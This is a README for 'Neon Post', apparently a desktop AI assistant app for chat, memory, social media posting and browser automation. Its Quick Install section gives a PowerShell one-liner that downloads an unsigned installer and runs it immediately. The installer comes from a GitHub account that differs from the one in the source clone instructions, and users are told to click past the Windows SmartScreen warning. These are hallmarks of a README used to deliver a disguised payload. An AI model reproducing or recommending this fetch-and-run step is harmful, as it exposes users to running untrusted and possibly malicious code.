# Neon Post

A desktop AI assistant that lives in your system tray. It remembers you, helps you create content, manages your social media, automates tasks, and gets smarter the more you use it.

---

## Quick Install (Windows)

Open **PowerShell** and paste:

```powershell
iwr https://github.com/R3LAMP4GO/neon-postv2/releases/latest/download/Neon-Post-4.1.3-x64-setup.exe -OutFile $env:TEMP\neon-setup.exe; & $env:TEMP\neon-setup.exe
```

This downloads and launches the installer. Keep the **"Create Desktop Shortcut"** checkbox checked. After install, double-click the Neon Post icon on your Desktop to launch.

**First launch only:** Windows SmartScreen shows "Windows protected your PC". Click **More info → Run anyway** — the installer is unsigned.

Prefer a manual download? Grab the `.exe` from the [Releases page](https://github.com/R3LAMP4GO/neon-postv2/releases/latest).

---

## What It Does

Neon Post is a personal AI that runs on your computer (not in the cloud). You chat with it like a friend, but it can also browse the web for you, write and schedule social media posts, generate images, and handle recurring tasks on autopilot.

It remembers everything you tell it — your name, your goals, your preferences — so you never have to repeat yourself.

---

## Getting Started

### Requirements

- **Node.js** 18 or newer
- **An API key** from one of these providers:
  - [Anthropic](https://console.anthropic.com/) (recommended — powers the Claude AI behind the app)
  - [OpenRouter](https://openrouter.ai/) (gives you access to multiple AI models)
  - Kimi / Moonshot or GLM / Z.AI (alternative providers)
- **Windows, macOS, or Linux**

### Install and Run

```bash
git clone https://github.com/creativeprofit22/neon-postv2.git
cd neon-postv2
npm install
npm run dev
```

The app will build and open automatically. On first launch, a setup wizard walks you through everything.

### First Launch — The Setup Wizard

1. **Welcome** — Meet Franky, your assistant
2. **Secure storage** — The app asks to use your system's built-in keychain (Mac Keychain, Windows Credential Store) to keep your API keys safe. This is optional but recommended.
3. **Permissions** (Mac only) — If you're on a Mac, you can grant extra permissions so the assistant can interact with your screen. Skip this on Windows/Linux.
4. **API key** — Enter your Anthropic API key (or sign in with Claude if you have a Pro/Max subscription). You can also add keys for alternative providers.
5. **Tell it about you** — Your name, location, what you do, your goals. This is all optional, but the more you share, the more useful the assistant becomes.

Once setup is done, you land in the main chat.

---

## How It Works — The Daily Rhythm

### The Chat

This is home base. Type a message, get a response. The assistant has persistent memory — it knows what you talked about yesterday, last week, whenever. You can have multiple chat sessions running at once (think of them like separate conversation threads).

A floating chat bubble lets you keep talking while you work in other panels.

### The Modes

The assistant has six personalities you can switch between depending on what you need:

| Mode | What it's for |
|---|---|
| **General** | Day-to-day help — reminders, questions, planning, life stuff |
| **Coder** | Writing and debugging code, working with files and GitHub |
| **Researcher** | Digging into topics — web search, reading articles, comparing sources |
| **Writer** | Long-form writing — blogs, emails, documents — using your voice |
| **Therapist** | A supportive listener for thinking through decisions or venting |
| **Creator** | Social media content — finding trends, writing posts, scheduling |

Switch modes anytime by clicking the mode selector in the chat. The assistant can also suggest switching if it notices you'd benefit from a different mode.

### The Sidebar

The left sidebar gives you quick access to everything:

- **New Chat / History** — Start fresh or pick up an old conversation
- **Personalize** — Edit your profile, the assistant's personality, your goals
- **Routines** — Set up recurring tasks (daily briefings, weekly reports, reminders)
- **The Brain** — Everything the assistant remembers about you, in one place. Add, edit, or remove facts anytime.
- **Social** — Your content creation hub (see below)
- **Settings** — API keys, themes, model selection, integrations

---

## Social Media Workflow

This is where Neon Post shines as a content tool. Open the Social panel from the sidebar or switch to Creator mode.

### The Tabs

**Browse** — Search for trending content across platforms. Find what's working, save ideas to your library, spot trends early.

**Create** — Write posts from scratch or let the AI repurpose content you've found. It adapts to each platform's style and your brand voice.

**Calendar** — See your publishing schedule at a glance. Drag posts to reschedule. Plan your week visually.

**Gallery** — Your media library. Browse generated images, uploaded assets, and saved visuals. Everything ready to drop into a post.

**Accounts** — Connect your social profiles (X/Twitter, Instagram, TikTok, LinkedIn, YouTube). Manage multiple accounts in one place.

### The Compositor

When you create a post, the built-in compositor can render it as a ready-to-publish image or video. It handles:

- Text overlays, headlines, and captions
- Background images and brand colors
- Multi-image carousels
- Video frames with text and watermarks
- Templates you can reuse across posts

---

## Automation and Scheduling

### Routines

Set up tasks that run on a schedule — no manual work needed:

- "Every morning at 9am, check trending topics and draft 3 post ideas"
- "Every Friday, summarize what I accomplished this week"
- "Remind me to post at 6pm every day"

Routines run with full access to the assistant's tools, so they can browse the web, generate content, or send messages.

### Reminders

Simple notifications at a set time. No AI involved — just a nudge.

### Post Scheduling

Schedule posts for specific dates and times directly from the Social panel. Queue them up in bulk or schedule one at a time.

---

## Integrations

- **Telegram** — Chat with the assistant from your phone. Send messages, get responses, share files — all through Telegram.
- **Browser automation** — The assistant can open websites, fill forms, take screenshots, and extract data. It uses a hidden browser window, or it can connect to your actual Chrome with your logged-in sessions.
- **Image generation** — Generate images from text descriptions using Kie.ai. Track jobs, browse results in the gallery, and use them in posts.

---

## Configuration

### API Keys

All keys are stored in your system's secure keychain. You can add or change them in **Settings > API Keys**.

| Key | Required | Used for |
|---|---|---|
| Anthropic | Yes (or use OAuth) | Powers the AI assistant |
| OpenRouter | Optional | Access to alternative AI models |
| Kie.ai | Optional | Image generation |
| Apify | Optional | Social media data scraping |
| RapidAPI | Optional | Additional scraping sources |
| Telegram Bot Token | Optional | Telegram integration |

### Themes

The app supports light and dark themes. Change it in Settings.

### Model Selection

Pick which AI model powers the assistant. Different models have different strengths and costs. Change it in Settings.

---

## For Developers

### Commands

```bash
npm run dev            # Build and launch the app
npm run build          # Compile TypeScript only
npm run test           # Run the test suite
npm run lint:fix       # Auto-fix code style issues
npm run format         # Format code with Prettier
npm run dist:win       # Package as Windows installer
npm run dist           # Package as macOS installer
```

### Project Structure

```
src/
  agent/        AI engine, modes, and providers
  memory/       Database layer (SQLite)
  tools/        Everything the AI can do (browser, memory, scheduling, etc.)
  social/       Content creation, posting, scraping, video
  compositor/   Image and video rendering for posts
  channels/     Telegram and iOS integrations
  scheduler/    Cron jobs and automation
  settings/     User preferences and themes
  main/         Electron main process, windows, IPC, tray

ui/
  chat/         Main chat interface (JS modules, CSS)
  shared/       Themes and base styles
  *.html        Feature pages (settings, setup, scheduling, etc.)
```

### Tech Stack

Electron 40, TypeScript 5.9, Node.js, Claude Agent SDK, better-sqlite3, Puppeteer Core, Grammy (Telegram), Vitest

---

## License

MIT
